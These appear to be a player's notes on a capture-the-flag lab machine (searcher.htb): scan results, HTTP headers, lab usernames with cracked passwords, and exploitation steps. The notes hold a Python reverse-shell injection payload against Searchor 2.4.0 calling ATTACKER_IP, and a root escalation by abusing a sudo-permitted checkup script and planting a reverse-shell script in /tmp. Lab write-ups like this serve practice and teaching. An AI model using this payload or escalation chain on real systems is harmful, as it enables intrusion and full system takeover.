| HOST         | PORT | PROTO | SERVICE      | VERSION                 |
| ------------ | ---- | ----- | ------------ | ----------------------- |
| 10.10.11.208 | 22   | tcp   | OpenSSH      | 8.9p1 Ubuntu 3ubuntu0.1 |
| 10.10.11.208 | 80   | tcp   | Apache httpd | 2.4.52                  |


## HEADERS
---
HTTP/1.1 302 Found
Date: Thu, 06 Jul 2023 16:52:28 GMT
Server: Apache/2.4.52 (Ubuntu)
Location: http://searcher.htb/
Content-Type: text/html; charset=iso-8859-1

---

## DIRECTORIES
---

---

## USERS
---
cody
svc : jh1usoih2bkjaspwe92 (machine user)
administrator : yuiu1hoiu4i5ho1uh (gitea admin)

---

## NOTES
---
Searchor 2.4.0

`', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ATTACKER_IP',PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#`

sudo -l `(root) /usr/bin/python3 /opt/scripts/system-checkup.py *`

`full-checkup` returns error

list all docker instances `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps`

inspect them revealing passwords `sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' instanceid`

add `gitea.searcher.htb` to hosts login as administrator

in `scripts/system-checkup.py` upon the `fukk-checkup` command it attempts to run a script `./full-checkup.sh` which does not exist

create a reverse shell .sh script in `/tmp` and run `sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup` with a listener open



---
